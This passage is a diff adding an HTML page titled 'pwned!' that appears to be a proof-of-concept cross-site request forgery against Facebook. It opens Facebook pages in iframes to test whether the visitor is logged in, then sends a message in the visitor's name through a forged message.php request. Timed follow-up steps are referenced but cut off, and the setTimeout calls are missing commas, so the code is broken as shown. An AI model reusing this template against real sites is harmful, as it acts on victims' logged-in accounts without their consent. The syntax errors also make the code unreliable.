@@ -1,0 +1,20 @@
+script.html:
+<html>
+<head>
+<title>pwned!</title>
+</head>
+<body>
+<iframe name="face" src="about:blank" width="95%" height="400"></iframe>
+<iframe name="script" src="about:blank" width="95%" height="400"></iframe>
+<script type="text/javascript">
+f0();
+setTimeout('f1()'2000);
+setTimeout('f2()'5000);
+setTimeout('f3()'8000);
+function f0() {
+// test if we are authenticated
+window.frames['face'].location="http://www.facebook.com/home.php"; }
+function f1() { // send a msg
+window.frames['face'].location="http://www.facebook.com/message.php?id=00000000&msg=word%20up%20ho&send=Send";
+}
+
